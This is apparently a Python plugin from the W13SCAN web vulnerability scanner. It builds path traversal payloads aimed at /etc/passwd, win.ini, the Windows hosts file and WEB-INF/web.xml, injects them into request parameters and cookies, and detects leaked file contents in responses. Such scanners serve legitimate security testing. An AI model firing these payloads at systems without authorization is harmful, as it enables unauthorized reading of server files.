#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/8 12:31 PM
# @Author  : w8ay
# @File    : directory_traversal.py
import copy
import re
from urllib.parse import unquote, quote

from lib.core.common import generateResponse, updateJsonObjectFromStr
from lib.core.data import conf
from lib.core.enums import PLACE, OS, WEB_PLATFORM, VulType, POST_HINT
from lib.core.output import ResultObject
from lib.core.plugins import PluginBase
from lib.core.settings import DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMITER


class W13SCAN(PluginBase):
    name = '路径穿越插件'

    def paramsCombination(self, data: dict, place=PLACE.GET, payloads=[], hint=POST_HINT.NORMAL, urlsafe='/\\'):
        """
        组合dict参数,将相关类型参数组合成requests认识的,防止request将参数进行url转义

        :param data:
        :param hint:
        :return: payloads -> list
        """
        result = []
        if place == PLACE.POST:
            if hint == POST_HINT.NORMAL:
                for key, value in data.items():
                    if ("." in value or "/" in value) or (key.lower() in ['filename', 'file', 'path', 'filepath']):
                        new_data = copy.deepcopy(data)
                        for payload in payloads:
                            new_data[key] = payload
                            result.append((key, value, payload, new_data))
            elif hint == POST_HINT.JSON:
                for payload in payloads:
                    for new_data in updateJsonObjectFromStr(data, payload):
                        result.append(('', '', payload, new_data))
        elif place == PLACE.GET:
            for payload in payloads:
                for key in data.keys():
                    value = data[key]
                    if ("." in value or "/" in value) or (key.lower() in ['filename', 'file', 'path', 'filepath']):
                        temp = ""
                        for k, v in data.items():
                            if k == key:
                                temp += "{}={}{}".format(k, quote(payload, safe=urlsafe), DEFAULT_GET_POST_DELIMITER)
                            else:
                                temp += "{}={}{}".format(k, quote(v, safe=urlsafe), DEFAULT_GET_POST_DELIMITER)
                        temp = temp.rstrip(DEFAULT_GET_POST_DELIMITER)
                        result.append((key, data[key], payload, temp))
        elif place == PLACE.COOKIE:
            for payload in payloads:
                for key in data.keys():
                    value = data[key]
                    if ("." in value or "/" in value) or (key.lower() in ['filename', 'file', 'path', 'filepath']):
                        temp = ""
                        for k, v in data.items():
                            if k == key:
                                temp += "{}={}{}".format(k, quote(payload, safe=urlsafe), DEFAULT_COOKIE_DELIMITER)
                            else:
                                temp += "{}={}{}".format(k, quote(v, safe=urlsafe), DEFAULT_COOKIE_DELIMITER)
                        result.append((key, data[key], payload, temp))
        return result

    def generate_payloads(self):
        payloads = []
        default_extension = ".jpg"
        payloads.append("../../../../../../../../../../../etc/passwd%00")
        payloads.append("/etc/passwd")
        if OS.LINUX in self.response.os or OS.DARWIN in self.response.os or conf.level >= 4:
            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
            payloads.append(
                "../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
        if OS.WINDOWS in self.response.os:
            payloads.append("../../../../../../../../../../windows/win.ini")
            # if origin:
            #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
            payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
        if WEB_PLATFORM.JAVA in self.response.programing:
            payloads.append("/WEB-INF/web.xml")
            payloads.append("../../WEB-INF/web.xml")
        return payloads

    def audit(self):
        plainArray = [
            "; for 16-bit app support",
            "[MCI Extensions.BAK]",
            "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.",
            "# localhost name resolution is handled within DNS itself.",
            "[boot loader]"
        ]

        regexArray = [
            '(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)',
            '(root:\w:\d*:)',
            "System\.IO\.FileNotFoundException: Could not find file\s'\w:",
            "System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s'\w:",
            "<b>Warning<\/b>:\s\sDOMDocument::load\(\)\s\[<a\shref='domdocument.load'>domdocument.load<\/a>\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s<b>.*?<\/b>\son\sline\s<b>\d+<\/b>",
            "(<web-app[\s\S]+<\/web-app>)",
            "Warning: fopen\(",
            "open_basedir restriction in effect"
        ]
        iterdatas = self.generateItemdatas()
        _payloads = self.generate_payloads()

        for origin_dict, positon in iterdatas:
            payloads = self.paramsCombination(origin_dict, positon, _payloads)
            for key, value, new_value, payload in payloads:
                r = self.req(positon, payload)
                if not r:
                    continue
                html1 = r.text
                for plain in plainArray:
                    if plain in html1:
                        result = ResultObject(self)
                        result.init_info(self.requests.url, "目录穿越导致任意文件被读取", VulType.PATH_TRAVERSAL)
                        result.add_detail("payload探测", r.reqinfo, generateResponse(r),
                                          "探测payload:{},并发现回显{}".format(payload, plain), key, new_value, positon)
                        self.success(result)
                        return
                for regex in regexArray:
                    if re.search(regex, html1, re.I | re.S | re.M):
                        result = ResultObject(self)
                        result.init_info(self.requests.url, "目录穿越导致任意文件被读取", VulType.PATH_TRAVERSAL)
                        result.add_detail("payload探测", r.reqinfo, generateResponse(r),
                                          "探测payload:{},并发现正则回显{}".format(payload, regex), key, new_value, positon)
                        self.success(result)
                        return
